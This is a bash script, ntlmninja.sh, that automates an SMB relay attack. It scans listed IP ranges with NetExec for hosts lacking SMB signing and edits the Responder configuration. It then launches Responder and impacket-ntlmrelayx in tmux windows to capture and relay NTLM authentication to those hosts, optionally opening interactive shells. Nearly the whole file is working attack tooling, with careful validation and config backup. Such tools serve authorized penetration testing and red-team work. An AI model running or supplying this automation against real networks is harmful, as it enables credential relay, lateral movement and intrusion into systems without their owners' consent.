#!/bin/bash
set -o pipefail
umask 077

# =============================================================
# ntlmninja.sh - SMB Relay Attack Automation Script
# -------------------------------------------------------------
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# =============================================================

# =========================
# CONFIG
# =========================
SESSION_NAME="smb_relay_attack"
TARGET_SMB_FILE="vulnerable_smb_targets.txt"
RESPONDER_CONFIG_FILE="/etc/responder/Responder.conf"
interactive=false
network_interface="auto"
scan_only=false
OUTPUT_ROOT="./ntlmninja-runs"
RUN_DIR=""
RESTORE_BACKUP=""
SESSION_ACTION=""
RUN_STATUS="preparing"
SESSION_ATTEMPTED=false
NO_COLORS=false

log() {
    local stamp line
    stamp=$(date -u '+%Y-%m-%dT%H:%M:%SZ') || return 1
    printf -v line '[%s] %s' "$stamp" "$*"
    printf '%s\n' "$line" || return 1
    if [ -n "$RUN_DIR" ]; then
        printf '%s\n' "$line" >> "$RUN_DIR/events.log" || return 1
    fi
}

fail() { log "ERROR: $*" >&2 || printf 'Error: %s\n' "$*" >&2; exit 1; }

finish_run() {
    local result=$?
    trap - EXIT
    if [ -n "$RUN_DIR" ]; then
        [ "$result" -eq 0 ] || RUN_STATUS=failed
        if ! printf 'status=%s\nexit_code=%s\n' "$RUN_STATUS" "$result" > "$RUN_DIR/status"; then
            printf 'Error: cannot write final run status.\n' >&2
            result=1
        fi
    fi
    if [ "$SESSION_ATTEMPTED" = true ]; then
        printf 'Session processes may still be running. Detaching/exiting does not stop them or restore configuration.\n' >&2
        printf 'Inspect with -a; stop with -k; restore separately with -r BACKUP_FILE.\n' >&2
    fi
    exit "$result"
}

# Accept explicit IP addresses/CIDRs only; never resolve names or expand scope.
normalize_targets() {
    python3 - "$1" <<'PY'
import ipaddress
import sys

try:
    targets = []
    seen = set()
    with open(sys.argv[1], encoding="utf-8-sig") as source:
        for number, raw in enumerate(source, 1):
            value = raw.partition("#")[0].strip()
            if not value:
                continue
            try:
                if "%" in value:
                    raise ValueError("scoped addresses are not supported")
                parsed = (ipaddress.ip_network(value, strict=True) if "/" in value
                          else ipaddress.ip_address(value))
            except ValueError:
                raise ValueError(f"Line {number}: expected an IP address or canonical CIDR network") from None
            normalized = str(parsed)
            if normalized not in seen:
                targets.append(normalized)
                seen.add(normalized)
    if not targets:
        raise ValueError("Target file contains no IP addresses or networks")
    print("\n".join(targets))
except (OSError, UnicodeError, ValueError) as error:
    print(f"Invalid target file: {error}", file=sys.stderr)
    sys.exit(1)
PY
}

prepare_run() {
    case "$OUTPUT_ROOT" in /*) ;; *) OUTPUT_ROOT="$PWD/$OUTPUT_ROOT" ;; esac
    mkdir -p "$OUTPUT_ROOT" || fail "Cannot create output directory: $OUTPUT_ROOT"
    RUN_DIR=$(mktemp -d "$OUTPUT_ROOT/run.XXXXXXXX") || fail 'Cannot create run directory.'
    cp "$TARGET_FILE" "$RUN_DIR/input-targets.txt" || fail 'Cannot snapshot target file.'
    normalize_targets "$RUN_DIR/input-targets.txt" > "$RUN_DIR/targets.txt" || fail 'Target validation failed; no scan started.'
    TARGET_FILE="$RUN_DIR/targets.txt"
    TARGET_SMB_FILE="$RUN_DIR/vulnerable_smb_targets.txt"
    : > "$TARGET_SMB_FILE" || fail 'Cannot initialize target output.'
    log "Run directory: $RUN_DIR" || fail 'Cannot write run log.'
    printf 'status=running\n' > "$RUN_DIR/status" || fail 'Cannot write run status.'
}

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

configure_colors() {
    if [ ! -t 1 ] || [ "${NO_COLOR+x}" = x ] || [ "$NO_COLORS" = true ]; then
        RED='' GREEN='' YELLOW='' BLUE='' CYAN='' RESET=''
    fi
}

# Network interface (dynamically detected by default)
detect_network_interface() {
    ip route 2>/dev/null | awk '
        $1 == "default" && !found {
            for (i = 2; i < NF; i++) if ($i == "dev") { print $(i+1); found=1; break }
        }'
}

# Print help
print_help() {
    echo -e "${BLUE}Usage: $0 -f TARGET_FILE [-s] [-o OUTPUT_DIR] [-i NETWORK_INTERFACE] [-x]${RESET}"
    echo "       $0 -r BACKUP_FILE"
    echo "       $0 -a | -k"
    echo '  -a / -k  Attach to / stop the existing session, then exit.'
    echo '  -C   Disable color (also disabled for redirected output or NO_COLOR).'
    echo '  -s   Scan only; do not change configuration or start tmux/services.'
    echo '  -o   Parent directory for unique run directories (default: ./ntlmninja-runs).'
    echo '  -r   Restore Responder configuration from a previously saved backup and exit.'
    echo -e "  ${YELLOW}-f TARGET_FILE${RESET}         (Required for scans) One IP address or canonical CIDR per line; # comments allowed."
    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: ${network_interface})."
    echo -e "  ${YELLOW}-x${RESET}                     (Optional) Enable interactive shell in ntlmrelayx."
    echo -e "  ${YELLOW}-h${RESET}                     Display this help and exit."
}

# Banner function
banner() {
  echo -e "${CYAN}"
  echo -e "                                                         "
  echo -e "    ▄     ▄▄▄▄▀ █    █▀▄▀█    ▄   ▄█    ▄    ▄▄▄▄▄ ██    "
  echo -e "     █ ▀▀▀ █    █    █ █ █     █  ██     █ ▄▀  █   █ █   "
  echo -e " ██   █    █    █    █ ▄ █ ██   █ ██ ██   █    █   █▄▄█  "
  echo -e " █ █  █   █     ███▄ █   █ █ █  █ ▐█ █ █  █ ▄ █    █  █  "
  echo -e " █  █ █  ▀          ▀   █  █  █ █  ▐ █  █ █  ▀        █  "
  echo -e " █   ██                ▀   █   ██    █   ██          █   "
  echo -e "                        by sp3ttro                       "
  echo -e "                                                         "
  echo -e "                                                         "
  echo -e "${RESET}"
}       

# Check if a tool is installed
check_tool() {
    echo -e "[*] Checking ${YELLOW}$1${RESET} if installed..."
    command -v "$1" > /dev/null 2>&1 || {
        fail "$1 is not installed or is not available in PATH."
    }
}

validate_privileges() {
    # Require root privileges
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] This script must be run as root. Exiting.${RESET}"
        exit 1
    fi
}

validate_target_file_arg() {
    if [ -z "${TARGET_FILE:-}" ]; then
        echo -e "${RED}[!] Missing required argument: -f TARGET_FILE${RESET}"
        print_help
        exit 1
    fi
}

validate_target_file() {
    # Check if file exists
    if [ ! -f "${TARGET_FILE}" ] || [ ! -r "${TARGET_FILE}" ]; then
        echo -e "${RED}[!] Target file '${TARGET_FILE}' not found or not readable.${RESET}"
        exit 1
    fi
}

# Validate network interface
validate_network_interface() {
    if [ -z "$network_interface" ]; then
        echo -e "${RED}[!] Could not detect network interface.${RESET}"
        exit 1
    fi

    [[ "$network_interface" =~ ^[a-zA-Z0-9_.:-]+$ ]] || fail 'Invalid interface name.'

    if ! ip link show "$network_interface" >/dev/null 2>&1; then
        echo -e "${RED}[!] Network interface ${network_interface} not found.${RESET}"
        exit 1
    fi
}

# Run NetExec
run_netexec() {
    local target_file="$1"
    local output_file="$2"
    local count address
    
    log 'Scanning SMB signing requirements.' || return 1
    log "Candidate output: $output_file" || return 1
    
    # Run NetExec and let it generate the relay list
    nxc smb "${target_file}" --gen-relay-list "${output_file}" 2>&1 | tee -a "$RUN_DIR/attack.log" || {
        fail 'NetExec or scan logging failed; partial results are not a completed scan.'
    }
    
    if [ -s "${output_file}" ]; then
    count=$(awk 'NF { count++ } END { print count+0 }' "$output_file") || return 1
    log "Reported $count host(s) with SMB signing not required. This does not prove exploitability." || return 1
    while IFS= read -r address || [ -n "$address" ]; do
        printf '%s\n' "$address" || return 1
    done < "${output_file}"
    else
        log 'No hosts reported with signing not required. Unreachable hosts and per-host errors remain inconclusive.' || return 1
    fi
    RUN_STATUS=scan-complete
}

# Edit Responder.conf file
edit_responder_conf() {
    local backup="$RUN_DIR/Responder.conf.backup" desired="$RUN_DIR/Responder.conf.updated"
    [ -f "$RESPONDER_CONFIG_FILE" ] && [ ! -L "$RESPONDER_CONFIG_FILE" ] || fail 'Responder configuration must be a regular, non-symlink file.'
    cp -p "$RESPONDER_CONFIG_FILE" "$backup" && cmp -s "$RESPONDER_CONFIG_FILE" "$backup" || fail 'Cannot create verified configuration backup.'
    # Reject absent or duplicate keys before changing the live configuration.
    awk '
        /^[[:space:]]*SMB[[:space:]]*=/ { smb++; print "SMB = Off"; next }
        /^[[:space:]]*HTTP[[:space:]]*=/ { http++; print "HTTP = Off"; next }
        { print }
        END { if (smb != 1 || http != 1) exit 1 }
    ' "$backup" > "$desired" || fail "Expected exactly one SMB and one HTTP setting; configuration unchanged. Backup: $backup"
    if cmp -s "$desired" "$RESPONDER_CONFIG_FILE"; then
        printf '[*] Responder configuration already set; backup: %s\n' "$backup"
        return 0
    fi
    replace_config "$desired" || fail "Configuration update failed. Backup: $backup"
    printf '[+] Configuration updated and verified. Backup: %s\n' "$backup"
    printf '[*] Restore later with: %q -r %q\n' "$0" "$backup"
}

# Stage alongside the destination for an atomic rename; preserve its metadata.
replace_config() {
    local source="$1" staged
    [ -f "$RESPONDER_CONFIG_FILE" ] && [ ! -L "$RESPONDER_CONFIG_FILE" ] || return 1
    staged=$(mktemp "${RESPONDER_CONFIG_FILE}.ntlmninja.XXXXXXXX") || return 1
    if ! cp -p "$RESPONDER_CONFIG_FILE" "$staged" ||
       ! cat "$source" > "$staged" || ! cmp -s "$source" "$staged" ||
       ! mv -f "$staged" "$RESPONDER_CONFIG_FILE"; then
        rm -f "$staged"
        return 1
    fi
    cmp -s "$source" "$RESPONDER_CONFIG_FILE"
}

restore_config() {
    [ -f "$RESTORE_BACKUP" ] && [ -r "$RESTORE_BACKUP" ] && [ -s "$RESTORE_BACKUP" ] || fail 'Backup is missing, empty, or unreadable.'
    replace_config "$RESTORE_BACKUP" || fail 'Configuration restoration failed.'
    printf '[+] Responder configuration restored and verified.\n'
}

# Function to start or attach to a tmux session and initialize windows
start_tmux_window() {
    local session_name=$1
    local window_name=$2
    local command=$3
    
    # Create the window in the tmux session
    tmux new-window -t "$session_name" -n "$window_name" -c "$RUN_DIR" || return 1
    
    # Send the command to the new tmux window
    tmux send-keys -t "$session_name:$window_name" "$command" C-m
}

# Function to execute SMB relay attack in tmux
run_smb_relay_attack() {
    local relay_command
    SESSION_ATTEMPTED=true
    echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a "$RUN_DIR/attack.log" || return 1

    if ! tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
        echo -e "${GREEN}[+] Creating tmux session: $SESSION_NAME.${RESET}"
        tmux new-session -d -s "$SESSION_NAME" -c "$RUN_DIR" || return 1
    fi

    echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
    start_tmux_window "$SESSION_NAME" "responder" \
        "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" || return 1

    # The pane starts in RUN_DIR, so use the fixed filename without shell interpolation.
    relay_command="impacket-ntlmrelayx -smb2support -tf vulnerable_smb_targets.txt"

    if [ "$interactive" = true ]; then
        echo -e "${YELLOW}[+] Enabling interactive shell (--interactive).${RESET}"
        relay_command+=" --interactive"
    fi

    relay_command+=" 2>&1 | tee -a relay_$(date +%s).log"

    echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
    start_tmux_window "$SESSION_NAME" "ntlmrelayx" "$relay_command" || return 1

    log 'Attaching to tmux. Detach leaves processes running; use -k to stop and -r to restore configuration.' || return 1
    tmux attach-session -t "$SESSION_NAME" || return 1
    RUN_STATUS=attachment-ended
}

parse_args() {
    local opt OPTIND=1 run_options=false actions=0 interface_given=false
    configure_colors
    while getopts ":f:hi:xso:r:akC" opt; do
        case $opt in
        f) TARGET_FILE="$OPTARG"; run_options=true ;;
        h) print_help; exit 0 ;;
        i) network_interface="$OPTARG"; run_options=true; interface_given=true; [ -n "$network_interface" ] || fail 'Interface cannot be empty.' ;;
        x) interactive=true; run_options=true ;;
        s) scan_only=true; run_options=true ;;
        o) OUTPUT_ROOT="$OPTARG"; run_options=true; [ -n "$OUTPUT_ROOT" ] || fail 'Output directory cannot be empty.' ;;
        r) RESTORE_BACKUP="$OPTARG"; actions=$((actions+1)); [ -n "$RESTORE_BACKUP" ] || fail 'Backup path cannot be empty.' ;;
        a) SESSION_ACTION=attach; actions=$((actions+1)) ;;
        k) SESSION_ACTION=stop; actions=$((actions+1)) ;;
        C) NO_COLORS=true; configure_colors ;;
        \?) 
            echo -e "${RED}[!] Invalid option: -$OPTARG${RESET}" >&2
            print_help
            exit 1
            ;;
        :)
            echo -e "${RED}[!] Option -$OPTARG requires an argument.${RESET}" >&2
            print_help
            exit 1
            ;;
        esac
    done
    shift "$((OPTIND - 1))"
    [ "$#" -eq 0 ] || fail 'Unexpected positional arguments.'
    if [ "$actions" -gt 1 ] || { [ "$actions" -gt 0 ] && [ "$run_options" = true ]; }; then
        fail 'Use exactly one of -a, -k, or -r separately from scan options.'
    fi
    [ "$scan_only" != true ] || [ "$interactive" != true ] || fail '-s and -x cannot be combined.'
    [ "$scan_only" != true ] || [ "$interface_given" != true ] || fail '-i is not used by NetExec scan-only mode; omit it.'
}

manage_session() {
    case "$SESSION_ACTION" in
        attach)
            SESSION_ATTEMPTED=true
            log 'Attaching to existing session. Detach leaves processes running.' || return 1
            tmux attach-session -t "$SESSION_NAME" ;;
        stop)
            tmux kill-session -t "$SESSION_NAME" || return 1
            log 'Session stopped. Configuration is unchanged; use -r BACKUP_FILE to restore it.' ;;
    esac
}

validate() {
    validate_privileges
    validate_target_file_arg
    validate_target_file
    validate_network_interface
}

# Start SMB Relay Attack
check_tmux_session() {
    if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
        [ -t 0 ] || fail 'An existing session needs attention. Use -a to attach or -k to stop it.'
        echo -e "${YELLOW}[!] Tmux session '${SESSION_NAME}' already exists.${RESET}"
        echo -e "${BLUE}Do you want to:${RESET}"
        echo -e "  [a] Attach to existing session"
        echo -e "  [k] Kill existing session"
        local user_choice
        read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice || fail 'No session action received.'
    
        case "$user_choice" in
            [aA])
                echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
                SESSION_ACTION=attach
                manage_session || exit 1
                exit 0
                ;;
            [kK])
                echo -e "${RED}[*] Killing existing tmux session...${RESET}"
                SESSION_ACTION=stop
                manage_session || exit 1
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
                exit 1
                ;;
        esac
    fi
}

# Check if required tools are installed
check_dependencies() {
    local t
    local tools=("nxc" "python3" "awk" "tee" "cp" "mkdir" "mktemp" "date")
    if [ "$scan_only" != true ]; then
        tools+=("tmux" "responder" "impacket-ntlmrelayx" "ip" "cmp" "cat" "mv" "rm" "date" "sleep")
    fi

    for t in "${tools[@]}"; do
        check_tool "$t"
    done
}

main() {
    local tool
    trap finish_run EXIT
    trap 'exit 130' INT
    trap 'exit 143' TERM
    parse_args "$@"

    if [ -n "$SESSION_ACTION" ]; then
        validate_privileges
        for tool in tmux date; do check_tool "$tool"; done
        manage_session || fail 'Session action failed.'
        return 0
    fi

    if [ -n "$RESTORE_BACKUP" ]; then
        validate_privileges
        for tool in cp cmp cat mktemp mv rm date; do check_tool "$tool"; done
        restore_config
        return
    fi
    validate_target_file_arg
    validate_target_file
    check_dependencies

    if [ "$scan_only" = true ]; then
        prepare_run
        run_netexec "$TARGET_FILE" "$TARGET_SMB_FILE" || exit 1
        log "Scan-only run finished. Review: $RUN_DIR" || fail 'Cannot write final log.'
        return 0
    fi
    
    if [ "$network_interface" = "auto" ]; then
        network_interface="$(detect_network_interface)" || fail 'Cannot read routes; check the ip command and routing configuration.'
    fi
    
    if [ -z "$network_interface" ]; then
        echo -e "${RED}[!] No active network interface detected (no default route).${RESET}"
        exit 1
    fi
        
    validate
    
    # Show the banner
    banner

    check_tmux_session
    prepare_run
    
    run_netexec "$TARGET_FILE" "$TARGET_SMB_FILE" || exit 1

    if [ ! -s "$TARGET_SMB_FILE" ]; then
        log 'No candidates reported; ending after the scan.' || exit 1
        exit 0
    fi

    edit_responder_conf || exit 1
    
    sleep 5
    run_smb_relay_attack || fail "Session setup or attachment failed. Review $RUN_DIR and any remaining tmux session."
}

if [ "${BASH_SOURCE[0]}" = "$0" ]; then main "$@"; fi
